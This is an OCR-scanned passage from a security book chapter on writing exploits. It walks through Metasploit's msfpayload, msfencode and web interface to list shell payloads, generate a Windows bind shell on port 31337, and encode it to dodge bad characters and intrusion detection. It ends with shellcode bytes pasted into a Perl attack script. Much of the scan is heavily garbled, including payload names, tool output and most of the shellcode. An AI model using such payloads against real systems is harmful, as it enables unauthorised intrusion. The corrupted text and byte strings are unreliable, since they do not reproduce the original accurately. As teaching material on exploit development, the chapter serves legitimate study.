hi d_ 1A 32_rewa me _£ t g 
hi d _i jvi.rt._h in d 
hi d_i (Hi.re_retierie 
h i d J.. 1*3:2 Jh ind. 
". .1 L i ,ty i,i.,,i -.(.j 
I , . , I L 
i , t y 
r 
-.-,, k 
h u l l 
\-iTS r r u i - v i r 
b i d i _ i*32 . r e v e r t * . 
-mi*i 3 
end u r n 
e_ 
iral 
I r i x 
bind 
cnd._i a IJbind. 
end J H | x _ » e * r a * 
end j>n | x _ » e * r * j * _ b a t h 
cad _un ix 
rtut r*a _e r4±t 
end u n i x r i v t r ^ t 
n c i 
y a n e r i c 
x f a r f 
r r a - v e 
ir i x _ n i p - •• «•••• •• u •• 
linux_ia3Z_adduier 
li-uK_ialZ_bind 
1 i-ux_ia 32 _biiid_i t ir 
I i n u x _ i a ] 2 j x e c 
I _-iiu__UJ_ _F ind n e w 
I I niLK_i a32 _ f Ind K C I I j t o 
l J - t L X _ t a l 2 _ f 1 n d i o e k 
l l n u x _ l * 3 2 _r*v*r? * 
llnux_l*32_rava r t a _ i n a u r i t y 
] ifMLX. 1*32 _r*Oa r t a _ t t g 
LHIILI-. 
n ^ l 
r r u r r - . r 
Ki1ki 
linn-. 
:t,.,t:- 
MHrinl 
] h m j p i K . P i m r : i 
c i x _ p p c _ b i n d 
c * x _jjpe -bind _ i t g 
c * x _(i|K _f Ind r*Ev_pa*k_ttg 
ai x _(ip* _f ind ratv_±tfl 
ai x _jppc _i*«va ri • 
VEX 
I'M 
' • ' • • " - 1 " - 
r 
ill 
•. 
I 
'| 
*31 i 
so 1-d p i i . s p i r t _ b i n d 
so lex i i _sparc 
« i r t rx D 
u • i'• 'A Z_nddui D r 
u i n J 2 _ M n d 
w J n 3 2_h lnd_d 1 L in jac t 
w in32_h l n d _ « t e r pre t c r 
w l n 3 2 _ M n d _ ± t g 
u j n 3 2 . hind_*tg_npak*c 
u(n3?_hind_uncinject 
uiri32_es-c 
w in 3 2_f • nd rec-ij_c- rd _-« t erpre te 
win32_f indrec-u_c r d _ i ty 
v i n 3 2 _ f lndrecu_c rd_-ijnc i n j e c t 
will 33 _ j * u r r s r 
uinH2_r*uflr*C _ d 1 1 I n j t r t 
wln3 2_r*u* r±c _n* t • rpr* t a r 
w in3 £ r ^ u r±C _0 rd 
w ln3 2 r r V > r T e . .6 rd _vne in Jo ct 
w• n3Z. n v i r ? i . _ c l a 
u ln3 Z _rr vo rse _ • I g _upe (rec 
w l n l 2_rewo r- e _unc i n j e c t 
BSD IA32 Bind S h e l l 
BSD IA3Z Staged B i n d S h e l l 
BSD IADS Execute C m m n d 
BED IADZ Recv las F i n d s o r k S h e l l 
BSD IA32 Staged Flndsnck S h e l l 
BSD IA32 SrcPnrt Pindsoch She 11 
BSD IA32 Reverie S h e l l 
BSD IA32 Staged K t u c r i i S h e l l 
BSD SPARC B i n d S h e l l 
BSD SPARC biuEt-sn S h r l l 
K P i 
J M 2 
Bind S h e l l 
H H 
l » 2 
C t u r i Bind 
S h * l l 
]i::r.i 
\nu : > , n,,-i 
h,:,i.„, k ::i„-1 ] 
B5Pi IA71T 
fewer;* 
S h w l l 
BSDi 
U 1 2 
St«?ed 
hrvrrr-- 
Eh«lL 
A r b i t r n r v 
Cennand 
IRIX J n c l d Bind S h e l l 
a r i s Inatd Bind S h a l l 
x Talnat Pining towarta S h a l l 
x 
^ d a v t c p Pivlng h v t m S h a l l 
x l a l n a t Piping IWuerse Sh»ll 
__ x £|Mu:*le?s 1 v i n e I 
P i p i n g R r v i r c v S h e l l 
BSD^Linuir/SolariE SPARC cVecuLr S h a l l 
IRIX niFS E K D G U I E S h e l l 
L i n u x in3:2 Add User 
Linux 
IA12 Bind S h e l l 
L i n u x 103:2 StA^ped B i n d S h a l l 
L i n u x III3:2 Execute Cormand 
L i n u x 1(132 
RECO l a g P i n d i a c k S I K I I 
L i n u x 1(132 Staged P t n d i o n k S h e l l 
1(132 S r c F a r t 
F l n d i a c h S h e l l 
n?2 R a v e n * S h a l l 
r ill III 
IP 
HI Stegad Ravarta j__ _ 
A32 Rav«n« WDP S h e l l 
PARC Bind S h a l l 
PARC RaiTETEE S h a l l 
rtnc OS M PPC B i n d S h e l l 
rUc OS X PPC Staved Hind S l ^ l l 
n,, OK V. fir. ••lr.,r,,-,1 t'i.nl Hr, v IVrh Ml,,- I I 
n.-, OM x r n : :; 
r,i E- 
K r , , K ^ L I 
h*c OS « PPC P«yarsa 5 h * l l 
nV-c OS K PK: Sl*yarl Reverse H u l l - F n a S h a l l 
rfac OS X PPC Slayed Reverse S h e l l 
S o l a r i s 
I M S 
Bind 
S h e l l 
I f l l ? S r c F o r l 
F i n d i o r k S h e l l 
Ifl3? Reverse 
S h e l l 
SPARC Bind S h e l l 
SPARC Reverie S h e l l 
Lfindmji. Execute net u s e r y'ADD 
Uindeui 
Bind S h e l l 
Uindeui Bind DLL I n j e c t 
Uindeui Bind H e t f l r p r e t f l r PLL I n j e c t 
UL.III.II,-. M1 „.,r..l llc.h.1 Zlw.l\ 
V l n d a w SCeg*d Bind Upload'Extcnta 
tfLndowi Bind titic Srt^rtr DLL I n j e c t 
Llindeus Execute Copmnnd 
Llindeui Hecu l a g Pindscck H e t e r p r e t e r 
Uindcui. Aeco l a g F i n d i o c k S I H I I 
Uindeui. Heco l a g F i r . d i c c k llhC I n j e c t 
kHndcu± Beuerae S h e l l 
Lfindau* Paver** DLL 
I s j a c t 
U Ld.il...... 
H I - U I I - . I - ni-l-i-|in-h-i- [J].I. I ii n i r 
Uindaw* Stegad Ravario CniinAl S h a l l 
U-L...lLjuri Revere* O r d i n a l UHC S e r v e r t n j e e l 
Uindews Scniied Reverce S h e l l 
Uindews Staged Reverce Uiiload^EKecute 
LJindews Reverse UNC S e r v e r I n j e c t 
Figure 12.32 Determining Payload Variables 
$ 
. / n n f ytA u 1 n A A 
uin'A'A _ b i nri 
K 
Hrtnp. 
U o r s i n n 
Needs Adnin 
Hi I I t \ 
I . i ' | i -
Total Size 
Meus 
Uinrious Hind S h e l l 
$ R n u i 3 i n n • 
• . . • i n 
::• 
•:••:'• 
Ho 
No 
321 
hind 
1.3a $ 
Provided By: 
ulad902 <ulad a02 Cat! 
A u a i l a h l e 
O p t i o n s : : 
Options: 
Nane 
g n a i l . c ; D r i > 
D e s c r i p t i o n 
required 
required 
BK11FUMC 
LPOHT 
•:r'lt 
1 1 1 1 
E x i t 
t c c h n i g u c r : 
" p i ' o c c s s " , 
" t h r e a d " 
L i r t p n i n j y 
p o r t 
F o r 
b i n d 
s h e l l 
A d v a n c e d 
O p t i o n s : 
A d v a n c e d 
< H s f : : P a y l o a d : : w i n 3 2 _ b i n d > : 
I • • i r . | . i "
i
i
: 
Listen for connection and spawn a shell 
$ _ 
" s f i -. m 11 r M • h i - k 

Writing Exploits III • Chapter 12 
521 
To generate the payload, we simply specify the value of any variables we wish to 
change along with the output format.The C option outputs the payload to be included 
in the C programming language while the P option outputs for Perl scripts. The final 
option, R, outputs the payload in raw format that should be redirected to a file or piped 
to msfencode. Because we will be encoding the payload, we will need the payload in 
raw format, so we save the payload to a file. We will also specify shell to listen on port 
31337. Figure 12.33 exhibits all three output formats. 
Figure 12.33 Generating the Payload 
h .,-n=f jwiylonirt Win32 .bind LFOHT -31337 C 
"NKfc^li^Ko hSH4F Mm BMI F f*- rl FMtf FMtf f ^ * 6 B \ x i tfSxtc SX24\M24\X9 bVrtE" 
\v>\vtfl,\.-7,\xW.\xYlt\*HL\iixFsxSb^4fs KlB\xKl-.\^.f 
^ : : « \ ^ l \ « 1 . | , \ l f [ " 
-^x3IKx4? \KB b\x 3 4\ HH b\ -Bl s *z »Mr31S*[; Bsx?5 ^xmr^xW^\x^\x'^\xV?^.iu: 1 " 
"sxC* \xW \xVl \xv V\ HA hs H 14sK3bsrt4sKZ4sxZB sx'^ Mtr 3 \ <* tj\ K<. f \ K 2 1\ * »I " 
'•\xrt}\xbt>\KXt<\Kn< 
^l^aHI^^Fsxlc^xIffl^xrft^xB^vxBG^xBb^KBY^xtcy..^" 
"sxl v \xt 1 \x,: 3 \x 3 1 \ *< M\ af. 4s »1*bsx4tfsx JHNXS^X4HVXFJL: \s8 EJ\JSV*J\ x 1,; \.. *••" 
" \ x | b\x4ir.xBll \xi, f l S xb <s "Srs. 4rs,d>rSx»r:^xFjBsxFf vxdb \ * 3 1 ^sd^aGfcV-.iS" 
• \T:.J I , M ' , « \ x F F \ xrl r. \ *S f \ . H ^ . r h^hhS., KI vxed \xlfl \xFfl \xM, \ * b * S x « ^ . F1" 
'^x?r^xt?vx57srfFSxMsx6asxitsM&lsri5sxFFsxd^xb^sx44SM4dsjAsx*f" 
•^xF l-/VxfFv..1(.V.V:^.^^>F^,,[MMftM\,r'-.^«^Kfr.^x^^ KV^,cF!^, r.1^.T,M-
•^arafi^^)(*ll,^«FI^«^l1s,'*:^^,^,IC^,^•/^,W^»•^.^*•J™^.•:•-.V^•:^E^•«1l1^•[l,!^^.FI•• 
'Nx«SxtbSxb *S *b IS *b F>\ -b KS -ftJ ^fcd\!. K¥ ^ . r \ *fc- xitf%*5?S>li?S xx: e S - i r " 
'-\xi,J/\xb.xSx4<SxS¥S x« 2S. It S..i ftSxf 3Sx**S.xf i , \ x « \x2(tSxf« S*4tf S -2:* S.Q2H' 
"sT(d^x7*sx^t\M»b\x*h>ju»b\x6lNK7aNxf r^xbl sxl t^xf f -n?S ,*41 xf f Midt" 
"sxS tNxST^x'j ^ \xV 1 -. & 1 \ nM \ n & ^ n U h r i I \ i - i 1 sxF>^ •Kxb 1 \y F F smMIs x(.&\ « „J •' 
-sxd?^xfR \x C« \x^ 3/\." F F s "dt>s H *s *f Fs*f FsxlT^xF F vxr1rj\ .-H h\ •!. y\ .Ft\"D'(" 
•"sx C4sxH\xf r \xrtt\fli Z^xF F sjrdSsp&ISxF <Nx|^x(H^xF> F \*V t\x F F sxxttSaF F " 
S .SfttFaftyleAd wLh32_blrhd LPOKT Ol 13? P 
-•^xtt \ x t i \ x , b\x4F s x* <s • F t^* F F \i F FSxF f Sn&ft^xl b\xtc \ X 2 4 S K 3 4 S X J &S..4S", 
'"^xjt\xibsxVe ,KxtSSifliSxBlS»F\K*bv»ii ^ •< L H \. N h\ K'. F \xS0\»,Hl \x* bVM 3", 
' , . JH\ K1V\>Hh\ I.M\«»liN>«^.fir\>:i| ,Vii W' • y? .-•-' -..HI'.••• I1\ KV1\««Vs« I " . 
' , . , A\ KH.1\.H1\« ,l\r.Th\r.H-.r. I]1^^^•1^^^"1^.:••H . - y . ,-r I \ r.M h\ xV E \ K^ i .^-111 " . 
,.rl,\.».1.\-HI,\Kj1 l •• KIT, rHI, .r'.J ^>l, V>WI\xrl.^H iMl!. \ FN f,\ x>< V \ Et,.: ^ . H " , 
'vxlcvxk 1 s« J\x3l SJK Vsx^MdbMriBVK j e ^ r t ! b * x 4 f s x * ^ x l hsn?fr.-1< s.w+ JHr, 
\ . N t A ^ H S ^ ! H \ , ' „ - . E^.M-^!H^-^!•t^^.Hr-^J.|•l \A1;.H--.A1 I \ALHI \ r. A 1 \ «1h\ tt, 1>S .*,:[- . 
V.x6x,VM6aSx3:KK.i:-l • 
• .M -. -'.•l\^•r^\^L^H^MbSSMcbSllfll^S.wf^:H^ 
^y J hSxSSNxf f Sxdts^.5 f ShSffSKt&VrfbXs. If I • ±±i -,>.m -, ..W2 SxESs^b AS EH2S n r f ". 
-SydaSxbflSxdYSxaTSv f ESJUEIM. VS-- * i i \.. ,»t -. xi 3 M<& 3 SyS 3 Sx5 IS*? JSirtSSjAa". 
"Sx43\xE 3Sxf f Slides rib ff\ ^1', l(\ ^ V.i ^ ^ fh-J -. > f.f. -. ^'^ 3 M i l * SMC 1 Sx9SSMbSSu4Sxl a". 
'*s.x7ft\xCvvx5?\x f f Sudts Mi aS Ki BSxSlSxBSSxf f \x JgSxlI sjc*t\x*dr<Oc2t\M*9,f. 
• • -wsv w F F . y.l r. \ K'. I \ y'. ^ - F f s .ilB^xbl^xVF>^x4? \vlil, -,-,W -, ^'. V-, x F F \ «l f.^ -<, M,r. 
••^xF>4 ^ 4 v x ^ S ^x F F \ x.l M-, x<tt-,,<.ti:*r 7S.X79 ^xC t sx'^ vx=j-^ x F F \ x,l r. ^ x'. ;-,*fi", 
' 
-..,1H 
,xF.I. 
,xl..,\xl. 1\xbF>^*f,^.t:i\"li^« W--.r'.\vF.,i\x&ro£9Md9MtKSxg»", 
'Mt'A.f.,, \ x44\xJW, xr ^^ . 31 ^ . * » \ . F ]Sx,^^xf * \x4^ \x>:.l \ x F*. \ x4j| \ ^ ^ .»J! •'. 
\.x..\ 
,,V,,-,Kw\K,t,\x,,r^z,,h\y.\.K-.»;y.^t,-^vi\.if.\.\ 
F-,^-^,\ Kii\ Kii\ K 1ir.-. 
\ x ! 1 h \ T ' . V \ < M \ . M \ > M N ^ t ^ ^ \ . M I \ . ! i l \ . M \ A ' , \ K M \ d F \K.IH\«<.M\K.iil ". 
'•^,•lV^xHS^«:^^«^:^^xFf^l«^^^l.^v.^l.f^^»l + ^,•^V^x^^^x•1«^KH^•^K^V^xF•:^*^^:^-. 
• ,-, 1 , . . . 1 V K F E ^ X . 1 I , ^ . ' . ^ J : F | - . X 1 I I ^ M I , H ^ J L ^ . K ^ . . L I 1 , . M ^ K ' . KKF E ^..II^^F I -. 
Adnlniat nk|»3iud 
321 Jin 31 21SiB (u/lodA 
ithinrjlHLtfAt 
"Vfrdneuor-k 
f 
Is -1 payload 
-1 
Because msipayload does not avoid bad characters, the C- and Perl-formatted output 
can be used if there are no character restrictions. However, this is generally not the case 
in most situations, so the payload must be encoded to avoid bad characters. 
Encoding is the process of taking a payload and modifying its contents to avoid bad 
characters. As a side effect, the encoded payload becomes more difficult to signature by 
IDS devices. The encoding process increases the overall size of the payload since the 
encoded payload must eventually be decoded on the remote machine. The additional 
size results from the fact that a decoder must be prcpended to the encoded payload. The 
attack string looks something like the one shown in Figure 12.34. 
Figure 12.34 Attack String with Decoder and Encoded Payload 
589 bytes of nop sled 
4 bytes overwriting saved 
return address 
decoder 
encoded payload 

522 
Chapter 12 * Writing Exploits III 
Metasploit's msfencode tool handles the entire encoding process for an exploit 
developer by taking the raw output from msfpayload and encoding it with one of several 
encoders included in the framework. Figure 12.35 shows the msfencode command-line 
options. 
Figure 12.35 msfencode Options 
Usage; 
3 i i t i n n : : : 
ncorie -h 
•^nsfencode <options> 
I v a r - v a l J 
-i <file> 
Specify the File that contains the paw she Lieode 
-a <arch> 
The target CPU architecture far the payload 
-a <DS> 
The target operating systen for the pay load 
-t <type> 
The output type: p e r l , c, or raw 
-b <chars> 
The characters to a v o i d : ' \ x 8 8 \ x F F ' 
-s <sise> 
ttaximin size of the encoded data 
-e <encoder> 
Try to use this encoder f i r s t 
-n <encoder> 
Dunp Encoder Infornation 
-1 
List a l l available encoders 
k 
^ l ^ J L 
J 
Table 12.1 lists the available encoders along with a brief description and supported 
architecture. 
Table 12.1 List of Available Encoders 
Encoder 
Brief Description 
Arch 
Alpha2 
Countdown 
JmpCallAdditive 
None 
OSXPPCLongXOR 
OSXPPCLongXORTag 
Pex 
PexAlphaNum 
PexFnstenvMov 
PexFnstenvSub 
QuackQuack 
ShikataGaNai 
Sparc 
Skylined's Alpha2 Alphanumeric Encoder 
x86 
x86 Call $+4 countdown xor encoder 
x86 
IA32 Jmp/Call XOR Additive Feedback Decoder x86 
The "None" Encoder 
all 
MacOS X PPC LongXOR Encoder 
ppc 
MacOS X PPC LongXOR Tag Encoder 
ppc 
Pex Call $+4 Double Word Xor Encoder 
x86 
Pex Alphanumeric Encoder 
x86 
Pex Variable Length Fnstenv/mov Double Word x86 
Xor Encoder 
Pex Variable Length Fnstenv/sub Double Word 
x86 
Xor Encoder 
MacOS X PPC DWord Xor Encoder 
ppc 
Shikata Ga Nai 
x86 
Sparc DWord Xor Encoder 
spare 
To increase the likelihood of passing our payload through the filters unaltered, we 
are alphanumerically encoding the payload. This limits us to either the Alpha2 or 
PexAlphaNum encoder. Because either will work, we decide on the PexAlphaNum 
encoder, and display the encoder information as seen in Figure 12.36. 

Writing Exploits III • Chapter 12 
Figure 12.36 PexAlphaNum Encoder Information 
ftdn Lit L s t r A t o r P n o t h i n g b u t f at *Vf rameuork 
£ ,/nsfencode -n PexALphaNun 
Nane: Pex Alphanumeric Encoder 
Uersion? $ R e u i s i o n : 1.19 $ 
OS^CPWi •xBfc 
Keysi 
alphanun 
Prouided By: 
Berend-Jan Ueuer < s k y l i n e d 
[ a t ] e d u p . t u d e l f t . n 1 > 
Advanced O p t i o n s : 
Advanced <Msf : : Encoder: :PexAlphaNur>> : 
P e s c r i p t i o n : 
S k y l i n e d ' s a l p l u n u n e r i c encoder p o r t e d t o p e r l 
^dnin i s t r n t o r P n o t h i n g h u t f a t 
*Vframework 
% 
-10I x| 
r 
i 
In the final step, the raw pay load from the file ~/framework /pay load is PexAlphaNum 
encoded to avoid the 0x00 character. The results of msfencode are displayed in Figure 
12.37. 
Figure 12.37 msfencode Results 
. . / n - Frni IIIIH-
£-1 U«ln* rttf; _ 
" ' ^ n •«mM'.7\^rh\^»'.\ici-M\i(F»\1iri 
s«if ^rrv.'ih\*'iii\."i'*\K'i>f\ii-tv.1i47i\ 
V X 4 B \ K 4 I M C 3 B \ X 4 2 SX3 3Sn 3 e N x 4 2 \ x 4 3 \ n S t \ K 5 l \ x 3 2 Sx42 S I < 4 4 \ X 4 2 \ X 4 B \ K 3 4 ", 
VJt^l^ht3z^ht^l^x^^sM3a^l,^l^ll^^\^,^^\>i:^•..|.1^y^] xi2sx]isx«M44\>ua: 
"^c5S^cSlMc34\x5ASx38Sii4?^x44^x4a\ic4F\K4d\x4fl\x4FSx4cSM3fc^x4b\ic4B'\ 
Vx4FNx34Mc4*\x4fls K4f Sx4F\K 1 f'.•• 4f \•• 4r s•• 4r sx41r sx41"\x4 M\y3b x 4 b \ n S I " , 
F^x4r\x5t\x4fc\x42 Sx4fc^>i 3 2^x4h^x4B\x4S\x44\x4o\x5 3 Sx4hSx 38^x4r\ic3^'", 
' ^ x 4 S \ x 3 B , n X 4 A \ X 3 7 \ X 4 1 iN^GNxHf^x4r^ic4b^•• SI\x4r • x54^x4«SxE 1 MHbM]l'", 
"Mt4FVit45\K42 ^x 3 2 \x41 w=. n\x4bVK4cVK43Nx4e\x42 ^x4 H \x47 \y 3 4 \ x 4 b \ x 5 l •", 
F^x4&\x43\x4hSx5fl Sx41 \xfifrud ih-x4r\ic4i \ x 5 3 \ x 4 Z Sx4c Sx4?Sx5?^x4r\ic4« '", 
" \ X 4 6 ^ I S I \ K 4 Z SX4C SX4€^H 3 ^ X 4 7 V X 5 B V K 4 1 \ K 4 C \ X 4 C \ X 4 C Sx4d^x5B^x41 \ H 5 » ' " , 
"\x44^4c\x4&\x4fl\x4€^x4F ^x4h^i£53\K4t^x55\x4fc\x32 Sx4a^x52:^x45\ic3^'", 
^ 4 3 V x 4 r \ x 4 1 ^ x S S ^x4 F •^x4S•^x4A•^x42^ x41 ^x5B\x4Ti^x4« \x4S\M 3fc\x4bMc4B ", 
I F ,.x4r\x3B^x4Ti^xS4^x4fAx ,j8Mi4fMiS^x4r^x^ 1^x41^x38^x4 (A >l4e•^x43^K3fl'•, 
'^x4BMr3Z^x4h^x3a ^x4?^x 38^x4^>x;&Mr4*^x3Z^x4r ^x41 ^x41 \M5bMriJ^K4c ", 
, F^x41\x33^x4Z^x4<;^x4^>i36'Hx4^x3;B^K4Z^x44^x4:>\v jnwlh\i'4B\x4Z^K44 ,\ 
"\ K4r\x3B^x4h^x38 ^x42 \x4?^.x4^x3;l M<4d^x4«\x4ft^x3B ^x4^•^x44^x4•^^t5B,•, 
'•N iAB^x3^x4fl ^xSfc VJIM)\H 38^x^i ih- K3:4^KSB^X3B\X4O^X4« SX42:\X 35Mrif ^ K 4 F '", 
"M*4B^x4d^x41 \vn\vll,\*.t,l\i:lk\:i'.^x43^x«^x4B^x4fc^x4*\x.4£'Hx43^K53 ,\ 
^ *44^X33^X4H- ^x3t \ x 4 7 \ *1 V-- * 4J\ • 47> x44^x^l ^x4 F vx3'.. \ x 4 t \* 4S\"4f ^ x4f ", 
'^x4Z^x4d^x4^l^x4^•^x4^l\x1^••^«4ll•^"4r^"4r^x^f 
\v1h\v'.•|\^-l^!\ K^^\ K4f^ll•1f ,', 
N K4B\*4d\*4 F VxL". \xA1 \x 3*\n4iMf 4 * \ K 4 l \ x i t \ x 4 1 \x4B Sx4dSx4t\x4*Mc3B" 
N X 4 4 \ K 3 B \ K 4 E \ X 4 5 S M + C S n 4 t ^ * 4 1 \ * il H-. > 11 -• • -II sx42s <4d•. <4 AS--G&\x4?Mc4d'". 
' ^ X 4 9 \ K 3 B \ X 4 5 \ X 4 t Sx4dSn4ft\ H 4 ? \ * 3 i\ > -11 -. *i I s x-W ^ x-1^ •• <4 il \ y 4 i \ x 4 3 \ x 4 5 ' " . 
,^x43\K45^K4 3 Sx55 Sx4 3 S M 5 ^ M ( 4 3 \ K 1 4 \ > 4 .^ ^lr.. ^ x-J :i ^ x-11-. <4 il \y 3S\x4f Mt4F'". 
L % x 4 Z \ x 4 d \ x 4 i \ x 3 t Sx4ASM4tSn4c \x3:7\x49\x4£\x4fl\x4t SX43:SM 3 S \ X 4 » \K1* '" 
*\x4l ^ X 4 E \ X 4 5 \ X 5 9 S x 4 i S M 4 t \ x 4 6 \ x 4 a \ n 4 Q \ x 3 1 \ x 4 2 \ x 4 7 \ M 4 7 \ x 4 c \X47^JI3:S • 
^\KM \XM \x4fl\x4dsx4c S«4tSx4Z\x3:i \x-l L v * ••,:• -• x-li. • X4'J Sx4f \ x 4 f \ x 4 2 \ n 4 d '" 
%x4a^jcS6\K4t\x44\x4dSn4a\x5 EKx42\ic49\x4fl\x47\x35 Sx4F \x4F \x4B\it4d • 
" \ X 4 3 ^ : J 5 \ K 4 5 \ X 3 5 Sx4f Sn4f \x4Z\x4d\n4a\x3t\x-Ji. v x4<- • <-11 \ --44\x4B-oc5l '" 
,^x4»^xS4^x4V^x,..^ • •.-U- ^'1F•^H4B•^x4d\^t4Z^x4^^x4t^x45Sx^tSx4S^x45^^tS5,• 
^ \ x 4 f V K 4 F \ X 4 Z Sx4dSx43 Sj(4?Loi4«\x^6Mt47\x4<i\x49 Sx37\x48Sx4c \x4»\x57'", 
V x 4 7 \ n 3 5 \ x 4 f \x* F Sx4SSii4d\x4S\x3:S\it4f \ x 4 f \x4Z Sx4dSx4SSx4«\x4c \ x 4 t " , 
'\n4&\x!i6\x4a SxLC Sx4ASn4t\x43\x3:6\it4d\x56\x49 Sx 38 Sx4^Sx4«\x4c \it4b ", 
Kot4Z\itS&Mt49 Sx55 Sx41 S M 4 Z \ X 4 » \ X 4 C M t 4 T \ x 4 l \ x 4 7 \ x 4 « SM4C \ X 4 « \ X 4 « \ K 3 4 •, 
1 v • 1V\ > 4K ^ x44 ^ x-1^ \x41 \ s l 3:\ H 4 Z \ K4C \ K 1 3\ x4 T ^ x4< - x4*Sn5SNx4F \ X 4 4 \ K 4 4 •", 
•^•x4dMt3Z\x5B\x4F Sx44Sn44^x4»^x^ZMt43\x4?\x4d\x^fl Sx4c Sx47\x4aMt33'", 
Vx4bNx4 j\H4b\x4*Sx4hSM4i\x4«\x^6Mt44\x37\x^«vx4 F \xA \\ \x4fa\x4BMc51 ", 
Vn4FNK4F\K45\x57\x4t\j(44\x4f \ x 4 f Mc4B\x4d ^x4 fcSa U S <4 7\ < 3S\x44MtS5 ", 
•\ „ 4 L \ > ' * ^ x4 J ^x PJ \ X 4 1 \ j (
,
J ^ M 4n \ »\i,^ x41 \ x 3 B \ x 4 t\xn ^x41 \x^^\x45Mi55 ", 
\ H 1 \K3i\K4f \ K 4 F SM42 SK44K*4*Mc4tMc4d\u4*\x4? \x4dSx4Vs» 3B\ .^Et\K4c:'". 
^x43^x3S\x4f -,x4tSx4»Sx44tSri4c^.3t\x^ 
^ 1 1 
^xlf 
v*4£ 
S y 4 7 \ M 4 3 \ x 4 f ^ K4F" 
^ x 4 2 \ x 4 d \ x 4 ti\y3fl \ * 4 ? \ * 4 !»S >1r s x \i \ * -b ^.- in \^ If. \ ^1,. \ ^4 h \ K*, frMi4f M(4F,J. 
^B 4B\x4d\x44 \x3? SM4 t Sx4f Sx42^. 4rt\^ 1.^ * \-,h \ ^ « \ ^4 \ \ F4H. M:*, ltV-4&^h:Sfl|J. 
^x4F^x3&\x43\x££Sx4rsx4r V H 4 B ^ X 4 J 
.xid 
\ ^ i \x1^\x4dSME^,hi 
The results of msfencode tell us that our preferred encoder succeeded in generating 
an alphanumeric payload that avoids the NULL character in only 717 bytes. The 
encoded payload is outputted in a Perl format that can be cut and pasted straight into an 
exploit script. 
Metasploit also provides a point-and-click version of the msfpayload and msfencode 
tools at www.metasploitxom/shellcode.html.The Web interface allows us to filter the pay-
loads based on operating system and architecture. In Figure 12.38, we have filtered the 
payloads based on operating system. We see the Windows Bind Shell that we used ear-
lier, so we click this link. 

524 
Chapter 12 * Writing Exploits III 
Figure 12.38 msfweb Payload Generation 
I 
|o*::win3? 
^J Final Ha Jul-1 | 
fl 
Windows Bind ULL. Inject: 
A 
Windows Bind Met erpretor DLL Inject 
£ 
windows Bind shell 
tf 
Windows Bind VNC Server DLL Inject 
4 
Windows Execute Command 
4 
Windows Execute nnt user /ADD 
fl 
Windows P*cv TagFindiochMvlnpnter 
After selecting the payload, the Web interface brings us to a page where we can 
specify the payload and encoder options. In Figure 12.39, we set our listening port to 
31337 and our encoder to PexAlphaNum. We can also optionally specify the maximum 
payload size in addition to characters that are not permitted in the payload. 
Figure 12.39 Setting msfweb Payload Options 
Bind ShaH 
win3?_btnd v].3D 
uUd902 <vl*»02 [«r] g-ri*l.cc",> 
H I byl*f 
usee* to eaviKCien * i d spawn t i*m 
EXTTTUfC l-i i.|nin-i! DATA 
• * * 
LPORT 
Required PORT 
31317 
Exit ttchmqut: 'fX«< 
lisl«r>riq port fw btnd s-ht-l 
Aailrlclvd Char«.-ton ( l i n i M l : I 
1j*l«iJ.pd bncodnr: 
| Uil..Enc™**f .PirTAIp4inN.rn 
j^J 
coratawr £ 2*03 'KK)5 *FT*s#*orT.CO« 
Clicking the Generate Payload button generates and encodes the payload. The 
results are presented as both C and Perl strings. Figure 12.40 shows the results. 

Writing Exploits III • Chapter 12 
525 
Figure 12.40 msfweb Generated and Encoded Payload 
windows Bind shell 
t* vin32_tolnd - 
C X i TT LIMC - je h LP0RT-31337 S I H ' 7 1 1 E ncode r -P*XA 1 p haNuro h t t p : / / K t a B p l o i t . 
unsigned ChHT 3CMSe(] 
• 
"\xeb^ X03\x59^ xeb\xQ 5 \ x e 9 \ x f 6 \ x f f \ x f f\x ff\x4tA x 49\x49\x 49\x49^ x 49 » 
4,^x49^xBI^x£aVxS6^x54Vx&s^x36^x^l^x3o^x56^x5s^x^4^x4l^x^Q^x42^x^ti~ 
"\x48\x4B\x3(Ax42\x33Vx30\x42\x43\x5SVx5e\x32*xi:\x44*x42\x48\x34" 
"\X41^ X32\X41^ X44\X3<AX41\X44\X54\*42Vx44\XS1\X42\X30\X41\X44\X41" 
-\ X 5 6\ X 5 B\ X 31 \ X 5»i K3S\ X 42 \ M l \ 11 «\ XI I \ 14d\ x4e\ x*t\ X1c\ 115 6\ X4B\ 11 e " 
Trwitwl. 
M »inJ2_biMI - rxITTTJHC-seh LPOP-T-JIJJ? 3IM-"M7 E header •P*x*lph&Hui" httpi^/wtftaploic • «* 
uy tatelicode • 
"\xeh\X01\xS9\xeB\xoS\X-»\XIS\XIH xlt\ xrn I1t\x4»\x19\x«\x19\149*. 
-\x1=>\x5l\xSo\x56\x54\xSS\*3S\x3 3\x)D\x5S\«58 ,ixJHX1l\x3(ttx13\x3 6-, 
" \ x4 a\ x48\ X 30\ x « \ X 3 3 \ x30\ xl 2 \ XI 3\ x 5*\ xSS\ X 3 ! \ X4*\ xl 4\ x « \ X 40\ x34". 
" \ x 4 r l x 3 2 \ x 4 l \ x 4 4 1 x 3 0 \ x 4 1 \ x 4 4 \ x 5 4 \ x 4 : \ x 4 4 \ x 5 1 \ x 4 2 \ x 3 0 \ x 4 1 \ x 4 4 \ x 4 1 " . 
" \ x S4\ x 58 \ x 3 4\ x 5a\ x 3 9\ x 42 \ x 4 4\ x 4a\ x 41\ x 4d\ x 4 e\ x41! \ x 4 c\ x5 &\ x 4b \ x 4e ". 
'\ X4f \ xS4> x4ft\ x4*l x49\ x4£\x4f \ x4E\x4f \ x4E> x4ISx4E\x42\x56\x4B\x5B". 
Now that we have covered the different methods that Metasploit offers to generate 
an encoded payload, we can take the payload and insert it into the exploit script.This 
step ii shown in Example 12.6. 
Example 12.6 Attack Script with Payload 
1 Spayload = 
2 -\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49' 
3 '\x49\x51\x5a\x56\x54\x5B\x36\x33\x30\x56\x5a\x34\x41\x30\x42\x36" 
4 •\x48\x48\x30\x42\x33\x30\x42\x43\x56\x53\x32\x42\x44\x42\x48\x34" 
5 -\x41\x32\x41\x44\x30\x4:Ax44\x54\x42\x44\x51\x42\x30\x41\x44\x4:i-
6 -\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4£\x4c\x36\*4b\x4e-
7 -\x4f\x34\x4a\x4e\x49\x4£\x4E\x4f\x4f\x4£\x4£\x4f\x42\x36\)t:4b\x58-
8 "\x4e\x56\x46\x42\x46\x32\x4b\x48\x45\x44\x4e\x53\x4b\x38\x4e\x37" 
9 •\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x58\x4f\x54\x4a\x51\x4b\x38-
